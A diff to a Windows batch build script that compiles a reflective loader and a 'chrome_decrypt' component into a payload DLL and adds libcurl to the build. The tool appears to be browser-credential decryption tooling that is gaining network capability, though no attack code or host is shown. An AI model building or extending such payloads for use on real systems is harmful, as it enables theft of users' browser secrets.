@@ -180,11 +180,12 @@ goto :eof
     call :run_command "%CMD_C%" "  - Compiling C file (reflective_loader.c)..."
     if %errorlevel% neq 0 exit /b 11
 
-    set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\sqlite /c %SRC_DIR%\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
+
+    set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\sqlite /I%LIBS_DIR%\curl\include /c %SRC_DIR%\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
     call :run_command "%CMD_CPP%" "  - Compiling C++ file (chrome_decrypt.cpp)..."
     if %errorlevel% neq 0 exit /b 1
     
-    set "CMD_LINK=link /NOLOGO /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.obj" "%BUILD_DIR%\reflective_loader.obj" "%BUILD_DIR%\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"%BUILD_DIR%\chrome_decrypt.lib""
+    set "CMD_LINK=link /NOLOGO /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.obj" "%BUILD_DIR%\reflective_loader.obj" "%BUILD_DIR%\sqlite3.lib" "%LIBS_DIR%\curl\lib\libcurl.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"%BUILD_DIR%\chrome_decrypt.lib""
     call :run_command "%CMD_LINK%" "  - Linking objects into DLL..."
     if %errorlevel% neq 0 exit /b 1
     
